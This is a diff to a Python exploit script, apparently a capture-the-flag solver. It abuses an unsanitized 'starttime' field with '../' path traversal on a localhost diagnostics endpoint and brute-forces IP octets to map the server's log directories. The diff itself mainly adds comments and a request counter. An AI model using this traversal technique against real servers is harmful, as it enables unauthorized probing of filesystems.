@@ -3,28 +3,21 @@ import requests
 import logging
 from pwn import *
 
-context.log_level = logging.INFO
-
 # log = logging.getLogger(__file__)
 # log.addHandler(logging.StreamHandler())
 # log.setLevel(logging.DEBUG)
 
-
-example_path = "diagnostics/var/logs/commands/by-ip/64/7F/00/02/2023_11_04_18_37_55_67755.json"
+# pwntools already has a log, just use that
+context.log_level = logging.INFO
 
 URL = "http://localhost:50505/diagnostics"
 
-RESPONSE_MSG = {"command_response":
-    {
-    "id": "00000000-0000-0000-0000-000000000000",
-    "starttime": "",
-    "endtime": "2023/11/04 18:37:55.67755",
-    "cmd":"ps",
-    "stdout":"","stderr":"","err":""
-    }
-}
 
 class IPDirSolver:
+    """
+    Class to abuse unsanitized input for a filepath like:
+    diagnostics/var/logs/commands/by-ip/64/7F/00/02/<unsanitized-starttime-input>.json
+    """
     def __init__(self, url):
         self.url = url
 
@@ -42,15 +35,23 @@ class IPDirSolver:
         # don't try to use a traversal for that one
         self.known_octets = []
         # bounds for a 100.64.0.0/12
+        # could cut out the 100 if the str size was less than 25, but
+        # with 25 bytes the filename will always have at least one byte
+        # for a filename
         self._octet_bounds = [(100, 100), (64, 79), (0, 255), (1, 254)]
         # found from error messages complaining that string wasn't exactly
         # equal to this
         self._expected_str_size = 25
+        # using a requests session means the server can serve multiple times
+        # without restarting the ssh session. much speed, such wow
         self._session = requests.session()
         self.written_paths = []
         self._octets_to_calc = len(self._octet_bounds)
+        # walk all the way back to the farthest back octet that is being
+        # brute forced
         self._initial_path_traversal = "../"*self._octets_to_calc
         self.found_ips = []
+        self.tried_ip_count = 0
         self.start_cmds()
 
     def start_cmds(self):
@@ -80,13 +81,19 @@ class IPDirSolver:
         return genned_path_with_file
 
     def try_request(self, genned_path):
+        """
+        Set the field with the starttime directory traversal and
+        send a request to the server
+        """
+        self.tried_ip_count += 1
         self.msg['command_response']['starttime'] = genned_path
         r = self._session.post(self.url, json=self.msg)
         return r
 
     def test_path_for_valid_directory(self, genned_path):
         """
-        Test a single path to determine if the directory is valid
+        Test a single path to determine if the directory is valid.
+        reurns a bool to indicate the validity of the tested directory
         """
         r = self.try_request(genned_path)
         if r.status_code == 200:
@@ -112,15 +119,21 @@ class IPDirSolver:
 
     def run(self):
         """
-        Do a recursive depth first search testing each ip octet to see if
+        Do a depth-first-search using recursion testing each ip octet to see if
         a directory matching that octet exists on the server
         """
 
+        # get the allowed bounds for the currently targeted octet
         oct_bounds_start, oct_bounds_end = self._octet_bounds[len(self.known_octets)]
 
+        # generate the string of the current ip (for logging)
         known_oct_ip_str = '.'.join(['%d' % i for i in self.known_octets])
+
         for oct_candidate in range(oct_bounds_start, oct_bounds_end+1):
+            # generate a string to determine whether the current
+            # oct_candidate is a vaild directory
             path_to_test = self.fmt_path_traversal_str(oct_candidate)
+            # trigger the bug and return whether
             res = self.test_path_for_valid_directory(path_to_test)
             if res is False:
                 continue
@@ -145,5 +158,6 @@ if __name__ == "__main__":
     ipds.run()
     for i in ipds.found_ips:
         log.success("found ip %s" % i)
+    log.info("took %d requests", ipds.tried_ip_count)
     ipds.kill_cmds()
 
